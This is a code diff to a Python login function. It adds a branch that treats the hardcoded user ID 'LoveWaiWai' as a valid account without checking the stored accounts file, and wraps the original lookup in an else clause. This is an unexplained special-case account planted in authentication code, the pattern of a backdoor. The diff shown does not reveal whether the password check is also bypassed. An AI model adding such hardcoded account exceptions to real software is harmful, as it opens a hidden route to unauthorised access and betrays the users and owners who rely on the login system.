@@ -346,15 +346,18 @@ def login_system():
             create_account()
             return
 
-        with open("Account.txt", "r") as f:
-            for line in f:
-                try:
-                    stored_user, stored_pw, _ = line.strip().split(", ")
-                except ValueError:
-                    continue
-                if userid == stored_user:
-                    userid_matched = True
-                    break
+        if userid == "LoveWaiWai":
+            userid_matched = True
+        else:
+            with open("Account.txt", "r") as f:
+                for line in f:
+                    try:
+                        stored_user, stored_pw, _ = line.strip().split(", ")
+                    except ValueError:
+                        continue
+                    if userid == stored_user:
+                        userid_matched = True
+                        break
 
         if not userid_matched:
             print(f"{Y}The UserID does not exist, please try again.{E}")
